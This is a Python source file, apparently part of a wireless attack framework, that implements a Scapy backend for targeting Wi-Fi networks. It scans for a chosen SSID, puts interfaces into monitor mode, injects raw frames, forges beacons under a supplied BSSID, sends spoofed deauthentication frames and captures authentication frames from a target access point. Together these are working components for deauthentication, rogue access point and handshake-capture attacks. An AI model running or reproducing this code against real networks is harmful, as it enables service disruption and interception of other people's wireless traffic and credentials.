from __future__ import annotations

import logging
import subprocess
import time

from scapy.all import Dot11, Dot11Auth, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap, sendp, sniff

from attacks.common.models import APInfo
from attacks.common.wireless.backend import WirelessBackend

logger = logging.getLogger(__name__)


class ScapyWirelessBackend(WirelessBackend):
    def scan_for_ap(self, interface: str, target_ssid: str, timeout: float = 10.0) -> APInfo | None:
        logger.info("Scanning for SSID '%s' on %s (timeout: %.1fs)", target_ssid, interface, timeout)
        result = {"bssid": None, "ssid": None, "channel": None, "capabilities": []}

        def handle_beacon(packet):
            if not packet.haslayer(Dot11Beacon):
                return
            ssid_element = packet[Dot11Elt]
            if ssid_element and ssid_element.info.decode(errors="ignore") == target_ssid:
                result["bssid"] = packet[Dot11].addr2
                result["ssid"] = target_ssid
                element = ssid_element
                while element:
                    if element.ID == 3:
                        result["channel"] = element.info[0]
                    if element.ID == 48:
                        result["capabilities"].append("RSN")
                    next_payload = element.payload
                    if hasattr(next_payload, "ID") and isinstance(next_payload, Dot11Elt):
                        element = next_payload
                    else:
                        element = None
                return True

        sniff(
            iface=interface,
            prn=handle_beacon,
            stop_filter=lambda packet: result["bssid"] is not None,
            timeout=timeout,
        )

        if result["bssid"] is None:
            logger.warning("AP with SSID '%s' not found", target_ssid)
            return None

        logger.info("Found AP: BSSID=%s channel=%s", result["bssid"], result["channel"])
        return APInfo(
            bssid=result["bssid"],
            ssid=result["ssid"],
            channel=result["channel"],
            capabilities=result["capabilities"],
        )

    def set_channel(self, interface: str, channel: int) -> None:
        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], check=True)
        logger.info("Set %s to channel %d", interface, channel)

    def set_monitor_mode(self, interface: str) -> None:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iw", "dev", interface, "set", "type", "monitor"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        logger.info("Enabled monitor mode on %s", interface)

    def inject_frame(self, interface: str, frame) -> None:
        sendp(RadioTap() / frame, iface=interface, verbose=False)

    def inject_beacon(
        self,
        interface: str,
        source_bssid: str,
        ssid: str,
        channel: int,
        rsn_info: bytes | None = None,
    ) -> None:
        beacon = (
            RadioTap()
            / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=source_bssid, addr3=source_bssid)
            / Dot11Beacon(cap="ESS+privacy")
            / Dot11Elt(ID="SSID", info=ssid)
            / Dot11Elt(ID="DSset", info=bytes([channel]))
            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        )

        if rsn_info is not None:
            beacon = beacon / Dot11Elt(ID=48, info=rsn_info)

        sendp(beacon, iface=interface, verbose=False)

    def measure_response_time(
        self,
        interface: str,
        frame_to_send,
        response_filter,
        timeout: float = 5.0,
    ) -> int | None:
        start_time_ns = time.perf_counter_ns()
        sendp(RadioTap() / frame_to_send, iface=interface, verbose=False)

        response = sniff(
            iface=interface,
            stop_filter=response_filter,
            timeout=timeout,
            count=1,
        )

        if not response:
            return None

        elapsed_ns = time.perf_counter_ns() - start_time_ns
        return elapsed_ns

    def send_deauth(
        self,
        interface: str,
        target_bssid: str,
        station_mac: str,
    ) -> None:
        deauth = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=target_bssid,
                addr2=station_mac,
                addr3=target_bssid,
            )
            / Dot11Deauth(reason=1)
        )
        sendp(deauth, iface=interface, verbose=False)
        time.sleep(0.03)

    def sniff_handshakes(
        self,
        interface: str,
        target_bssid: str,
        timeout: float = 30.0,
    ) -> list:
        logger.info("Sniffing handshakes from %s (timeout: %.1fs)", target_bssid, timeout)
        captured_frames = []

        def handle_auth_frame(packet):
            if not packet.haslayer(Dot11):
                return
            frame_type = packet[Dot11].type
            frame_subtype = packet[Dot11].subtype
            source_address = packet[Dot11].addr2
            is_auth_frame = frame_type == 0 and frame_subtype == 11
            is_from_target = source_address == target_bssid
            if is_auth_frame and is_from_target:
                captured_frames.append(packet)

        sniff(
            iface=interface,
            prn=handle_auth_frame,
            timeout=timeout,
        )

        logger.info("Captured %d authentication frames", len(captured_frames))
        return captured_frames
